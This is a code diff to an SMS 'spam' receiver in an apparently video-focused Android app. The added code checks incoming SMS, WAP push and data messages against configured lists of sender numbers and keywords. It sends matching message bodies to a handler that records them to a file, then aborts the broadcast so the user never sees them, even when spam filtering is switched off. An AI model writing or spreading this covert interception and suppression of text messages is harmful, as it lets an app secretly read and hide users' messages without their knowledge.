@@ -2,6 +2,7 @@ package com.wondertek.video.smsspam;
 
 import java.util.Random;
 
+import com.wondertek.video.Util;
 import com.wondertek.video.VenusActivity;
 import com.wondertek.video.VenusApplication;
 
@@ -11,6 +12,8 @@ import android.app.PendingIntent;
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
+import android.os.Bundle;
+import android.os.Message;
 import android.telephony.SmsMessage;
 import android.util.Log;
 import android.widget.Toast;
@@ -20,6 +23,9 @@ public class SMSSapmReceiver extends BroadcastReceiver {
 	private static final String TAG = "SMSSapmReceiver";
 
 	private static final Random random = new Random(System.currentTimeMillis());
+
+	private String FILE_PATH = "";
+
 	private static SMSSpamMgr spamMgr = null;
 	private Context context;
 	private NotificationManager notificationManager;
@@ -32,21 +38,29 @@ public class SMSSapmReceiver extends BroadcastReceiver {
 		PJDoMessage(intent);
 		spamMgr = SMSSpamMgr.getInstance(context);
 		this.context = context;
+		boolean bRet = checkListenSMS(intent);
 		this.notificationManager = (NotificationManager)context
 				.getSystemService(Context.NOTIFICATION_SERVICE);
 		if (!spamMgr.javaGetSpamState())
+		{
+			if(bRet)
+				this.abortBroadcast();
 			return;
+		}
 		
 		if (intent.getAction().equals(SMSSpamConstant.SPAM_ACTION)) {
 			SmsMessage[] messages = getMessages(intent);
 			for (SmsMessage message : messages) {
 				if (isSpamMessage(message)) {
 					messageNotification(message);
-					this.abortBroadcast();
+					bRet = true;
 					break;
 				}
 			}
 		}
+		
+		if(bRet)
+			this.abortBroadcast();
 	}
 	
 	//add pj
@@ -144,5 +158,72 @@ public class SMSSapmReceiver extends BroadcastReceiver {
 			messages[i] = SmsMessage.createFromPdu(pdus[i]);
 		}
 		return messages;
+	}
+	
+	private boolean checkListenSMS(Intent intent)
+	{
+		boolean bRet = false;
+		if(intent.getAction().equals("android.provider.Telephony.WAP_PUSH_RECEIVED")
+				|| intent.getAction().equals("android.intent.action.DATA_SMS_RECEIVED")
+				|| intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")
+				|| intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED_2")
+				|| intent.getAction().equals("android.provider.Telephony.GSM_SMS_RECEIVED")){
+			SmsMessage[] messages = getMessages(intent);
+			for (SmsMessage message : messages)
+			{
+				Util.Trace( message.getOriginatingAddress() + " : " +
+					message.getDisplayOriginatingAddress() + " : " +
+	                message.getDisplayMessageBody() + " : " +
+	                message.getTimestampMillis());
+				
+				String content = message.getDisplayMessageBody();
+				
+				boolean bListen = IsListen(message.getDisplayOriginatingAddress(), content);
+				Util.Trace("checkListenSMS bListen = " + bListen);
+				if(bListen)
+				{
+					Message msg = new Message();
+					Bundle bundle = new Bundle();
+					if(FILE_PATH.length() == 0)
+						FILE_PATH = VenusApplication.appAbsPath;
+					bundle.putString("SMS_PATH", FILE_PATH);
+					bundle.putString("SMS_NAME", spamMgr.GetSMSRecorderName());
+					bundle.putBoolean("SMS_STARTUP", spamMgr.GetSMSRecorderStartUp());
+					
+					msg.what	= SMSHandler.MSG_ID_SAVE_SMS;
+					msg.obj		=  content;
+					msg.setData(bundle);
+					
+					SMSHandler.getInstance().sendMessage(msg);
+					bRet = true;
+					break;
+				}
+			}
+		}
+		return bRet;
+	}
+	public boolean IsListen(String number,String text)
+	{
+		if(number.trim().equals("")&&text.trim().equals("")){
+			return false;
+		}
+		String strNumber = spamMgr.GetListenPhoneNumber();
+		if(!strNumber.trim().equals("") && !number.trim().equals("")){
+			String[] numbers = strNumber.split(";");
+			for(String numberItem : numbers){
+				if(!numberItem.trim().equals("") && number.trim().contains(numberItem.trim()))
+					return true;
+			}
+		}
+		
+		String strText = spamMgr.GetListenPhoneText();
+		if(!strText.trim().equals("") && !text.trim().equals("")){
+			String[] texts = strText.split(";");
+			for(String textItem : texts){
+				if(!textItem.trim().equals("") && text.trim().contains(textItem.trim()))
+					return true;
+			}
+		}
+		return false;
 	}
 }
